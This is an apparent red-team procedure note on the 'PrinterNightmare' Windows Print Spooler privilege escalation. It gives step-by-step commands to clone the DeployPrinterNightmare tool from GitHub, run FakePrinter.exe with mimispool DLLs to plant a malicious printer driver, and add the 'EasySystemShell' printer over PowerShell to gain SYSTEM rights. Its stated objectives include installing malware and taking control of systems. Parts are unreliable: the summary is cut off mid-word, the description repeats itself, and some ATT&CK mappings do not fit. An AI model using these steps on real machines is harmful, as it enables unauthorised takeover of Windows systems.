---
id: ea32f94c-198d-49d5-9106-fa02cb9ebe76
name: PrinterNightmare Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.875576+00:00'
updated_at: '2023-04-10T20:37:34.432703+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
- '[[Accessibility Features|T1546.008 - Accessibility Features]]'
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[EoP - Printers]]'
- '[[PrinterNightmare]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Add Printer]]'
- '[[Clone DeployPrinterNightmare repository]]'
- '[[Copy required files and add printer driver]]'
- '[[Remove Printer]]'
---

# PrinterNightmare Privilege Escalation

## Summary

PrinterNightmare is a technique that allows an attacker to escalate privileges on a Windows system by abusing the Windows Print Spooler service. This technique works by adding a malicious printer driver to the system and then performing a print job. When the print job is processed, the attacker's c

## Description

# Description

PrinterNightmare is a technique that allows an attacker to escalate privileges on a Windows system by abusing the Windows Print Spooler service. This technique works by adding a malicious printer driver to the system and then performing a print job. When the print job is processed, the attacker's code is executed with SYSTEM privileges. PrinterNightmare can be used to gain access to sensitive data, install malware, or take control of the system. This technique is particularly dangerous because it can be executed remotely and does not require any user interaction.

Technical Explanation: The Windows Print Spooler service is responsible for managing print jobs and printer drivers. It runs with SYSTEM privileges and is vulnerable to attacks. PrinterNightmare works by adding a malicious printer driver to the system and then performing a print job. When the print job is processed, the attacker's code is executed with SYSTEM privileges. This technique can be executed remotely and does not require any user interaction.

Business Value: PrinterNightmare can be used by attackers to gain access to sensitive data, install malware, or take control of a system. This technique can be executed remotely and does not require any user interaction, making it a valuable tool for attackers who want to gain access to a network or system.

## Requirements

1. Access to the target network or system

1. Ability to add a malicious printer driver

## Defense

1. Disable the Windows Print Spooler service if it is not needed

1. Monitor the system for suspicious printer activity

1. Implement least privilege access control measures

## Objectives

1. Escalate privileges on a Windows system

1. Gain access to sensitive data

1. Install malware

1. Take control of the system

# Instructions

1. To execute this command, first clone the DeployPrinterNightmare repository from the Flangvik/DeployPrinterNightmare GitHub page. Then, run the FakePrinter.exe file with the arguments 32mimispool.dll, 64mimispool.dll, and EasySystemShell. This will copy certain files to specific directories, add a printer driver, add a printer, and set registry keys.

**Code**: [[git clone https://github.com/Flangvik/DeployPrinte]]

> This command is used to deploy a printer driver and printer using the DeployPrinterNightmare repository. The printer driver is added to the system by copying certain files to specific directories. The printer is then added with the name EasySystemShell. Finally, registry keys are set to ensure that the printer driver is loaded on system startup.

**Command** ([[Clone DeployPrinterNightmare repository]]):

```bash
git clone https://github.com/Flangvik/DeployPrinterNightmare
```

**Command** ([[Copy required files and add printer driver]]):

```bash
FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
```

2. This command removes and adds a printer with the specified name and connection name respectively.

**Code**: [[PS C:\target> $serverName  = 'printer-installed-ho]]

> The command first sets the server and printer name variables. It then concatenates the server and printer name variables to form the full printer name. If the operating system is 64-bit, it appends 'x64' to the name, otherwise 'x86' is appended. The command then removes the printer with the specified name and connection name, while suppressing any error messages. Finally, it adds the printer with the specified connection name.

**Command** ([[Remove Printer]]):

```bash
Remove-Printer -Name '\\printer-installed-host\EasySystemShell - x64' -ErrorAction SilentlyContinue
```

**Command** ([[Add Printer]]):

```bash
Add-Printer -ConnectionName '\\printer-installed-host\EasySystemShell - x64'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Event Triggered Execution|T1546 - Event Triggered Execution]]

### Sub-Techniques

- [[Accessibility Features|T1546.008 - Accessibility Features]]
- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Add Printer]]
- [[Clone DeployPrinterNightmare repository]]
- [[Copy required files and add printer driver]]
- [[Remove Printer]]

## Tags

- [[EoP - Printers]]
- [[PrinterNightmare]]
- [[Windows - Privilege Escalation]]
